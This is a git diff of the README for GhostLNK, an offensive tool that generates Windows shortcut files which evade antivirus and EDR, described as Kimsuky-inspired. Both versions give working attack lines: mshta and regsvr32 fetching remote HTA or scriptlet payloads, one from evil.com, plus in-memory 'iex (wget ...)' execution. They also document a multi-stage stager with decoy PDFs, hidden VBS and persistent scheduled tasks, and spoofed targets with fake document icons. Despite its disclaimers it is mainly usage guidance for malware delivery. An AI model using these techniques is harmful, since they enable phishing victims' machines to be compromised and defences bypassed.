@@ -1,460 +1,250 @@
 <p align="center">
-  
-# 👻 GhostLNK - Advanced LNK Generator with Evasion 👻
-
-[![Python](https://img.shields.io/badge/Python-3.8+-blue.svg)](https://www.python.org/)
-[![PyQt6](https://img.shields.io/badge/PyQt6-6.0+-green.svg)](https://www.riverbankcomputing.com/software/pyqt/)
-[![Platform](https://img.shields.io/badge/Platform-Windows-lightgrey.svg)](https://www.microsoft.com/windows)
-[![License](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![GitHub](https://img.shields.io/badge/GitHub-Excalibra-purple?style=flat&logo=github)](https://github.com/Excalibra/)
-
+  <img src="https://readme-typing-svg.demolab.com?font=Fira+Code&weight=600&size=28&duration=3000&pause=500&color=6A1F7A&center=true&vCenter=true&width=600&lines=GhostLNK;Advanced+LNK+Generator+%2B+Evasion;Kimsuky+Inspired+Tradecraft" alt="GhostLNK" />
 </p>
 
+<p align="center">
+  <!-- Badges -->
+  <a href="https://www.python.org/"><img src="https://img.shields.io/badge/Python-3.8+-3776AB?style=for-the-badge&logo=python&logoColor=white" alt="Python"></a>
+  <a href="https://www.riverbankcomputing.com/software/pyqt/"><img src="https://img.shields.io/badge/PyQt6-6.0+-41CD52?style=for-the-badge&logo=qt&logoColor=white" alt="PyQt6"></a>
+  <a href="https://www.microsoft.com/windows"><img src="https://img.shields.io/badge/Platform-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white" alt="Windows"></a>
+  <a href="LICENSE"><img src="https://img.shields.io/badge/License-MIT-yellow?style=for-the-badge" alt="License"></a>
+  <a href="https://github.com/Excalibra"><img src="https://img.shields.io/badge/GitHub-Excalibra-181717?style=for-the-badge&logo=github" alt="GitHub"></a>
+</p>
 
-<img width="1350" height="914" alt="image" src="https://github.com/user-attachments/assets/532f7d0e-b985-41da-8b7d-cb1e04c91ae6" />
-
-
----
-
-## Overview
-
-**GhostLNK** is a professional‑grade Windows LNK (Shortcut) file generator with advanced stealth capabilities and an intuitive step‑by‑step workflow. Designed for security researchers, penetration testers, and red team operations, it enables the creation of sophisticated LNK files that can bypass modern antivirus detection while maintaining realistic appearances.
-
-### Use Cases
-
-- Security Research & Malware Analysis
-- Red Team Operations & Penetration Testing
-- Phishing Simulation & User Awareness Training
-- Educational Demonstrations of Attack Vectors
+<p align="center">
+  <img width="900" alt="GhostLNK Interface" src="https://github.com/user-attachments/assets/532f7d0e-b985-41da-8b7d-cb1e04c91ae6">
+</p>
 
 ---
 
-## Key Features
+## 🧬 Overview
 
-### 🚀 Advanced Payload Generation
+**GhostLNK** is a state‑of‑the‑art Windows LNK (shortcut) generator that blends advanced evasion, modular staging, and a retro‑inspired interface. It equips red teams and security researchers with the tools to simulate nation‑state tradecraft—bypassing modern EDR signatures while maintaining convincing disguises.
 
-| Feature | Description |
-|---------|-------------|
-| **📁 Download & Open** | Downloads files to temp directory and opens them with default applications |
-| **⚡ Memory Execution** | Executes PowerShell scripts directly in memory – no files written to disk |
-| **🕵️ Ultra Stealth Mode** | Minimal output with obfuscated commands for maximum AV evasion |
-| **🎯 Raw Target Mode** | Bypass PowerShell entirely – run any executable (mshta.exe, cmd.exe, custom tools) with custom arguments |
-
-### 🛡️ Advanced Evasion Techniques
-
-GhostLNK implements modern "Living off the Land" (LotL) and structural evasion methods:
-
-| Technique | Description |
-|-----------|-------------|
-| **conhost.exe Proxy** | Launches PowerShell via the trusted `conhost.exe` binary to evade parent‑process detection. |
-| **LNK Stomping (Target Spoofing)** | Makes the LNK appear to point to a benign file (e.g., `invoice.pdf`) while actually executing the payload. This bypasses static analysis that inspects the displayed target path. |
-| **regsvr32.exe Proxy (Fileless)** | Executes a remote scriptlet (SCT) or DLL using `regsvr32.exe`. The command `regsvr32 /s /n /i:"http://server/payload.sct" scrobj.dll` runs entirely in memory, leaving no disk artifacts. |
-
-### Multi‑Level Stealth System
-
-| Level | Name | Description | AV Evasion |
-|-------|------|-------------|------------|
-| 0 | Normal | Standard output, visible window | ❌ Low |
-| 1 | Moderate | Uses aliases, avoids obvious patterns | ⚠️ Medium |
-| 2 | Maximum | Obfuscated code, no suspicious flags, AV bypass attempt | ✅ High |
-
-### Professional GUI Features
-
-- **Step‑by‑Step Workflow** – Clear 5‑step process with visual progress indicators
-- **Smart Conflict Resolution** – Automatic option disabling with visual feedback
-- **Real‑Time Visual Feedback** – Green highlights for active selections, gray for disabled
-- **Tooltip Explanations** – Hover over any control for detailed help
-- **Dark Theme Interface** – Easy on the eyes during long analysis sessions
-- **Real‑Time URL Validation** – Automatic Dropbox URL checking with `dl=1` detection
-- **Icon Masquerading** – 8+ realistic icon options (PDF, Word, Excel, etc.)
-- **Live Console Output** – Real‑time logging and debugging information
-- **Multi‑Format Support** – Generate LNK files with customizable names and extensions
-- **Smart Import** – Automatically adds `-E` prefix to base64 strings when pasted manually
-
-### Technical Capabilities
-
-- **Base64 Encoding** – Automatic PowerShell command encoding (UTF‑16LE)
-- **Smart Payload Detection** – Auto‑suggests payload type based on URL extension
-- **Recent History** – Saves recent URLs and conversions for quick access
-- **Cross‑Format Export** – Copy commands, arguments, or generate complete LNK files
-- **Raw Target Execution** – Directly invoke any Windows executable with full argument control
+> [!IMPORTANT]
+> This tool is intended **exclusively** for authorized security testing, education, and research. Unauthorized use is strictly prohibited.
 
 ---
 
-## Installation
+## 🧰 Key Features
+
+### 🚀 Core Payload Engines
+
+| Mode | Description |
+|------|-------------|
+| 📥 **Download & Open** | Fetch a remote file, save to temp, and open with default app. |
+| ⚡ **Memory Execute** | Run a PowerShell script directly in memory—no disk footprint. |
+| 🥷 **Ultra Stealth** | Minimal output, heavily obfuscated commands for maximum AV evasion. |
+| 🎯 **Raw Target** | Bypass PowerShell entirely: run any EXE with custom arguments. |
+
+### 🛡️ Advanced Evasion (Kimsuky‑Inspired)
+
+| Technique | Effect |
+|-----------|--------|
+| 🔀 **conhost.exe Proxy** | Launches PowerShell via the trusted `conhost.exe` to defeat parent‑process monitoring. |
+| 🎭 **LNK Stomping** | Spoofs the displayed target path (e.g., `invoice.pdf`) while executing the real payload. |
+| 📡 **regsvr32 Proxy** | Fileless execution of remote SCT/DLL using `regsvr32.exe`. |
+| 🧩 **Multi‑Stage Stager** | LNK → hidden VBS → decoy PDF → scheduled task → final payload. |
+| 🔐 **XOR Encoding** | Encrypts embedded scripts with a user‑supplied key. |
+| 🧵 **String Obfuscation** | Splits suspicious strings (`powershell` → `('po'+'wer'+'she'+'ll')`). |
+
+### 🎚️ Stealth Levels
+
+| Level | Behavior | AV Evasion |
+|-------|----------|------------|
+| **0 – Normal** | Standard output, visible window | Low |
+| **1 – Moderate** | PowerShell aliases, no obvious flags | Medium |
+| **2 – Maximum** | Obfuscated code, no `-WindowStyle Hidden` | High |
+
+### 🖥️ Professional Interface
+
+- **Two‑Column Header** – Title & credits on the left, live console on the right.
+- **Neon Matrix Aesthetic** – High‑contrast monospaced theme for readability.
+- **Step‑by‑Step Workflow** – Numbered stages with visual progress indicators.
+- **Smart Conflict Resolution** – Incompatible options auto‑disable with tooltip explanations.
+- **Live Dropbox Validation** – Instant feedback on `dl=1` parameter.
+- **Icon Masquerading** – 8+ realistic file icons (PDF, Word, Excel, etc.).
+- **Recent History** – Quick recall of previous URLs and conversions.
+
+---
+
+## 📦 Installation
 
 ### Prerequisites
+- **Python 3.8+**
+- **Windows OS** (LNK generation requires Windows API structures)
 
+### One‑Liner Setup
 ```bash
-# Python 3.8 or higher required
-python --version
-
-# Windows OS (required for LNK file generation)
-```
-
-### Quick Setup
-
-```bash
-# Clone the repository
 git clone https://github.com/Excalibra/GhostLNK.git
-
-# Navigate to directory
 cd GhostLNK
-
-# Install dependencies (auto‑installed on first run)
-pip install PyQt6 pylnk3
-
-# Make the script executable (optional)
-chmod +x ghostlnk.py
-```
-
-### Dependencies
-
-GhostLNK automatically installs missing dependencies on first run:
-
-- **PyQt6** – Professional GUI framework
-- **pylnk3** – Core LNK file generation engine
-
----
-
-## Usage Guide
-
-### Launching GhostLNK
-
-```bash
-# Basic launch
+pip install PyQt6 pylnk3   # Auto‑installed on first run if missing
 python ghostlnk.py
-
-# Or make executable and run directly
-./ghostlnk.py
 ```
 
-### Quick Start – 5 Step Workflow (PowerShell Mode)
-
-#### Step 1: Enter Your URL
-```
-Example: https://www.dropbox.com/scl/fi/abc123/document.pdf?dl=1
-```
-
-#### Step 2: Select Payload Type
-- **PDF/Image/Document** → Choose "Download & Open"
-- **PowerShell Script** → Choose "Memory Execute"
-- **Maximum Stealth** → Choose "Ultra Stealth"
-
-#### Step 3: Configure Stealth Level
-- **Level 0 (Normal)** – Visible output, for testing
-- **Level 1 (Moderate)** – Uses aliases, avoids obvious patterns
-- **Level 2 (Maximum)** – Obfuscated code, AV bypass attempt
-
-#### Step 4: Execution Options
-- **⏸️ Pause after execution** – Keeps window open (auto‑disabled when incompatible)
-- **🐛 Enable Debug Mode** – Verbose output for troubleshooting
-- **🔒 Hide PowerShell Window** – Complete invisibility (auto‑disables pause/debug)
-
-> 💡 **Smart Conflict Resolution**: Options automatically disable with visual feedback when incompatible combinations are selected. Hover over any disabled option to see why.
-
-#### Step 5: Generate (Follow the Numbers)
-```
-⚠️ MUST CLICK IN THIS ORDER: 1 → 2 → 3 → 4
-
-1️⃣ Show Command      → Preview your payload
-2️⃣ Encode to Base64  → Generate -E argument
-3️⃣ Copy -E Argument  → Copy to clipboard
-4️⃣ Generate LNK from URL → Build the LNK file
-```
-
-**Visual Progress Tracker:**
-```
-Progress: ⚪ Step 1 → ⚪ Step 2 → ⚪ Step 3 → ⚪ Step 4
-          (Turns green as you complete each step)
-```
-
-### Raw Target Mode
-
-Sometimes you don't want PowerShell at all. **Raw Target Mode** lets you generate LNK files that execute any program directly – perfect for `mshta.exe`, `rundll32.exe`, `cmd.exe`, or your own tools.
-
-#### How to Use Raw Target Mode
-
-1. **Enable Raw Target Mode** – Check the box in the right panel.
-2. **Set Target Path** – Full path to the executable (e.g., `C:\Windows\System32\mshta.exe`).
-3. **Set Arguments** – Any command‑line arguments.  
-   *Note: URLs should be enclosed in quotes – optional but safe.*  
-   Example: `"https://example.com/script.hta"`
-4. **Working Directory (optional)** – e.g., `%TEMP%` or `C:\Users\Public`.
-5. **Choose Icon & Output Name** – Same as always.
-6. **Generate LNK** – The shortcut will run your raw target directly.
-
-#### Example: mshta.exe with Remote HTA
-
-```
-Target Path: C:\Windows\System32\mshta.exe
-Arguments:   "https://raw.githubusercontent.com/astro-opensource/cloud-sync-tools/main/Adobe_Reader_Update.hta"
-```
-
-> 💡 **Why use Raw Target Mode?**  
-> - Avoid PowerShell detection entirely  
-> - Execute traditional binaries with custom flags  
-> - Run HTA, VBS, or any other script host  
-> - Perfect for living‑off‑the‑land (LOLBins) techniques
-
-### Importing Existing Base64 Strings
-
-If you have a pre‑existing base64 encoded PowerShell command (from another tool), paste it directly into the **Import -E Argument** field and click **Import**. GhostLNK will automatically add the `-E` prefix if it's missing.
-
-```
-Example:
-Paste: SQBFAFgAIAAoAE4AZ...
-Click Import → Automatically becomes: -E SQBFAFgAIAAoAE4AZ...
-```
-
-### Advanced Evasion Options
-
-Located in the right panel under **🛡️ Advanced Evasion**:
-
-| Option | What It Does | When to Use |
-|--------|--------------|-------------|
-| **conhost.exe Proxy** | Changes the LNK target to `conhost.exe` and passes PowerShell as an argument. | Evade parent‑process monitoring that looks for direct `powershell.exe` launches. |
-| **LNK Stomping** | Makes the shortcut appear to point to a fake path (e.g., `C:\Users\Public\Documents\invoice.pdf`). | Bypass static analysis tools that inspect the LNK's displayed target. |
-| **regsvr32.exe Proxy** | Uses `regsvr32.exe` to fetch and execute a remote scriptlet (SCT) or DLL. | Achieve fileless execution – the payload never touches disk. |
-
-**Important:** These options can be combined (except regsvr32 overrides PowerShell‑based payloads). The GUI will handle conflicts automatically.
+> GhostLNK automatically installs missing dependencies when launched.
 
 ---
 
-## Stealth Mode Deep Dive
+## 🧪 Usage Guide
+
+### 🚀 Quick Start (PowerShell Payload)
+
+1. **Enter URL** – e.g., a Dropbox link with `&dl=1`.
+2. **Choose Payload Type** – Download & Open, Memory Execute, or Ultra Stealth.
+3. **Set Stealth Level** – 0 (normal) to 2 (maximum obfuscation).
+4. **Execution Options** – Pause, debug, or hide window.
+5. **Generate** – Follow the numbered buttons: Show → Encode → Copy → Use.
+
+```
+[1] Show Command   → preview
+[2] Encode         → base64
+[3] Copy -E        → clipboard
+[4] Use in LNK     → load into generator
+```
+
+### 🔧 Raw Target Mode
+Enable **Raw Target Mode** to launch any executable directly:
+```
+Target: C:\Windows\System32\mshta.exe
+Args:   "https://evil.com/payload.hta"
+```
+
+### 🧬 Embedded Payload (No Network)
+Paste a PowerShell script directly into the **Embedded Payload** area. Enable XOR encoding or string obfuscation for extra stealth. The generated LNK contains a self‑decoding stub that runs entirely from the command line.
+
+### 🧩 Multi‑Stage Stager (Kimsuky Style)
+1. Check **Multi‑Stage Stager**.
+2. Provide a **Decoy PDF URL** (opened immediately).
+3. Provide the **Final Payload URL** (executed via scheduled task).
+The LNK drops a VBS script in a hidden folder, opens the decoy, and creates a persistent scheduled task with a random GUID name.
+
+---
+
+## 🧠 Stealth Deep Dive
 
 ### Why Stealth Matters
-
-Modern antivirus solutions actively monitor for:
+EDRs and AVs flag:
 - `-WindowStyle Hidden` flags
-- Long encoded PowerShell commands
-- Suspicious combinations of arguments
-- Known malicious patterns
+- Long, high‑entropy Base64 strings
+- Suspicious parent‑child process relationships
 
-### Maximum Stealth (Level 2) Techniques
-
+### Maximum Stealth (Level 2) Example
 ```powershell
-# Instead of this (easily detected):
-powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -E SQBFAFgAIAAoAE4AZ...
+# Instead of:
+powershell.exe -WindowStyle Hidden -E SQBFAFgAIAAoAE4AZ...
 
-# GhostLNK Level 2 generates:
-powershell.exe -E SQBFAFgAIAAoAE4AZ...
-
-# Payload is obfuscated:
-iex (wget -useb "https://your-server.com/payload.ps1");
+# GhostLNK Level 2 produces:
+powershell.exe -E SQBFAFgAIAAoAE4AZ...   # Payload internally uses iex (wget -useb ...)
 ```
 
-### Stealth Comparison
-
-| Technique | Level 0 | Level 1 | Level 2 |
-|-----------|---------|---------|---------|
-| `-WindowStyle Hidden` | ✅ | ❌ | ❌ |
-| Full Cmdlet Names | ✅ | ❌ | ❌ |
-| PowerShell Aliases | ❌ | ✅ | ✅ |
-| Variable Obfuscation | ❌ | ❌ | ✅ |
-| Comment Removal | ❌ | ✅ | ✅ |
-| Minimal Output | ❌ | ✅ | ✅ |
+### LNK Stomping in Action
+The LNK’s internal `LinkTargetIDList` is deliberately malformed. Windows Explorer “corrects” the displayed path to a benign file (e.g., `C:\Users\Public\Documents\invoice.pdf`), while the actual command still executes.
 
 ---
 
-## Payload Examples
+## 📁 Configuration
 
-### Download & Open Mode (Stealth Level 2)
+### `ghostlnk_config.json`
+```json
+{
+  "recent_urls": ["https://dropbox.com/...", "http://vps/file.pdf"],
+  "recent_conversions": ["-E SQBFAFgAIAAoAE4AZ..."]
+}
+```
+
+### Custom Icons
+Edit `ICON_DATABASE` in `ghostlnk.py`:
+```python
+ICON_DATABASE = {
+    "My App": (r"C:\Path\to\app.exe", 0, ".custom"),
+}
+```
+
+---
+
+## 🧬 Payload Examples
+
+### Download & Open (Level 2)
 ```powershell
-# Generated command
 $u="https://dropbox.com/file.pdf?dl=1";$t=[IO.Path]::GetTempPath();$f=[IO.Path]::Combine($t,"doc.pdf");(New-Object Net.WebClient).DownloadFile($u,$f);Start "$f";
 ```
 
-### Memory Execute Mode (Stealth Level 2)
+### Memory Execute (Level 2)
 ```powershell
-# Generated command
 iex (wget -useb "https://your-server.com/script.ps1");
 ```
 
-### Raw Target Mode (mshta.exe)
+### Raw Target (mshta)
 ```
 Target: C:\Windows\System32\mshta.exe
-Arguments: "https://example.com/update.hta"
+Args:   "https://example.com/update.hta"
 ```
 
-### regsvr32 Proxy (Fileless)
-```
-Target: C:\Windows\System32\regsvr32.exe
-Arguments: /s /n /i:"http://192.168.1.100/payload.sct" scrobj.dll
-```
+### Multi‑Stage Stager Output
+- **LNK**: runs PowerShell that creates `%APPDATA%\Microsoft\MicrosoftEdge_XXXXX\update.vbs`
+- **VBS**: opens decoy PDF and schedules a hidden task
+- **Task**: executes `iex (iwr 'http://payload/launcher.ps1')`
 
 ---
 
-## Configuration
+## 🧰 Troubleshooting
 
-### Settings File (`ghostlnk_config.json`)
-```json
-{
-    "recent_urls": [
-        "https://dropbox.com/s/abc123/file.pdf?dl=1",
-        "https://your-vps.com/script.ps1"
-    ],
-    "recent_conversions": [
-        "-E SQBFAFgAIAAoAE4AZ..."
-    ]
-}
-```
-
-### Customizing Icon Database
-Edit the `ICON_DATABASE` dictionary in `ghostlnk.py`:
-```python
-ICON_DATABASE = {
-    "Custom Application": (r"C:\Path\to\your\app.exe", 0, ".custom"),
-    # Add your own entries...
-}
-```
+| Symptom | Likely Fix |
+|---------|------------|
+| LNK doesn't execute | Verify URL accessibility and `dl=1` on Dropbox. |
+| AV still detects | Increase stealth to Level 2, use Memory Execute, or enable **regsvr32** / **Multi‑Stage**. |
+| GUI won't start | `pip install PyQt6 pylnk3` manually. |
+| Buttons stay grayed out | Update to latest code; conflict logic was refined. |
+| Import doesn't add `-E` | Click the **Import** button after pasting. |
 
 ---
 
-## Performance Metrics
+## 📚 Educational Resources
 
-| Operation | Time |
-|-----------|------|
-| GUI Launch | < 2 seconds |
-| URL Validation | < 100ms |
-| Base64 Encoding | < 50ms |
-| LNK File Generation | < 200ms |
-| Memory Usage | ~50-80 MB |
-
----
-
-## Project Structure
-
-```
-GhostLNK/
-├── ghostlnk.py                 # Main application
-├── README.md                    # Documentation
-├── LICENSE                      # MIT License
-├── ghostlnk_config.json         # Auto-generated config
-└── requirements.txt             # Dependencies (optional)
-```
-
----
-
-## Educational Resources
-
-### Understanding LNK Attacks
-- [Microsoft LNK File Format Specification](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/)
-- [MITRE ATT&CK - LNK Files (T1204.002)](https://attack.mitre.org/techniques/T1204/002/)
+- [Microsoft LNK Format](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/)
+- [MITRE ATT&CK T1204.002](https://attack.mitre.org/techniques/T1204/002/)
 - [Red Team LNK Tradecraft](https://redteam.guide/docs/Execution/LNK)
 
-### Detection & Prevention
-- Monitor PowerShell event logs (Event ID 4104, 4103)
-- Enable AMSI (Antimalware Scan Interface)
-- Deploy application whitelisting
-- Implement user awareness training
+---
+
+## ⚖️ Legal & Ethical Use
+
+> [!CAUTION]
+> GhostLNK is **only** for:
+> - ✅ Authorized penetration testing
+> - ✅ Educational demonstrations
+> - ✅ Defensive research
+>
+> Unauthorized use violates laws and is strictly prohibited.
 
 ---
 
-## Legal & Ethical Use
+## 🤝 Contributing
 
-**IMPORTANT:** GhostLNK is designed for:
-
-✅ **Authorized Security Testing** – With written permission from system owners  
-✅ **Educational Purposes** – Learning about attack vectors and defense  
-✅ **Incident Response** – Simulating attacks to test defenses  
-✅ **Research** – Understanding malware capabilities  
-
-**UNAUTHORIZED USE IS STRICTLY PROHIBITED**
-
-- ❌ Do not use on systems you don't own
-- ❌ Do not use for malicious purposes
-- ❌ Do not distribute malicious LNK files
-- ❌ Do not bypass security controls without authorization
+1. Fork the repo
+2. Create a feature branch (`git checkout -b feature/amazing`)
+3. Commit changes (`git commit -m 'Add amazing feature'`)
+4. Push (`git push origin feature/amazing`)
+5. Open a Pull Request
 
 ---
 
-## Contributing
+## 🙏 Acknowledgments
 
-We welcome contributions from the security community!
-
-### How to Contribute
-
-1. **Fork the Repository**
-   ```bash
-   git clone https://github.com/Excalibra/GhostLNK.git
-   ```
-
-2. **Create a Feature Branch**
-   ```bash
-   git checkout -b feature/amazing-feature
-   ```
-
-3. **Commit Your Changes**
-   ```bash
-   git commit -m 'Add amazing feature'
-   ```
-
-4. **Push to Your Fork**
-   ```bash
-   git push origin feature/amazing-feature
-   ```
-
-5. **Open a Pull Request**
-
-### Development Guidelines
-
-- Follow PEP 8 style guidelines
-- Add comments for complex logic
-- Update documentation for new features
-- Test thoroughly before submitting
-
----
-
-## Troubleshooting
-
-### Common Issues & Solutions
-
-**Q: LNK file doesn't execute properly**
-- Verify URL is accessible
-- Check Dropbox URLs have `dl=1`
-- Ensure target system has PowerShell (or your raw target exists)
-
-**Q: Antivirus still detects the file**
-- Increase stealth level to 2
-- Use Memory Execute mode
-- Try **Raw Target Mode** or **regsvr32 Proxy** for fileless execution
-
-**Q: GUI won't launch**
-- Install PyQt6: `pip install PyQt6`
-- Check Python version: `python --version`
-- Verify Windows OS
-
-**Q: Options stay grayed out after deselection**
-- This was fixed in recent updates; ensure you have the latest code.
-
-**Q: Not sure which order to click buttons**
-- Follow the numbered steps (1️⃣ → 2️⃣ → 3️⃣ → 4️⃣)
-- Watch the progress indicators turn green
-
-**Q: Import field doesn't add `-E` automatically**
-- Click the **Import** button after pasting; the tool will add the prefix if missing.
-
-**Q: LNK Stomping not working?**
-- Ensure the spoof path is a valid Windows path (e.g., `C:\Users\Public\Documents\invoice.pdf`). The LNK will display that path but execute the real payload.
-
----
-
-## Acknowledgments
-
-- Thanks to the pylnk3 developers for the core LNK engine
-- Inspired by real‑world APT techniques and red team tools
-- Special thanks to the security research community
+- **pylnk3** for core LNK manipulation
+- The security research community for continuous inspiration
+- APT tradecraft that drives defensive innovation
 
 ---
 
 <p align="center">
-  <b>👻 GhostLNK – Advanced Evasion LNK Generator 👻</b><br>
-  For authorized security testing and educational purposes only
+  <b>GhostLNK – Evasion at the Edge of Tradecraft</b><br>
+  <sub>For authorized use only</sub>
 </p>
 
 <p align="center">
   <img src="https://img.shields.io/badge/Python-3.8+-blue?style=flat-square">
-  <img src="https://img.shields.io/badge/Platform-Windows-lightgrey?style=flat-square">
+  <img src="https://img.shields.io/badge/Windows-10%2F11-lightgrey?style=flat-square">
   <img src="https://img.shields.io/badge/License-MIT-yellow?style=flat-square">
 </p>
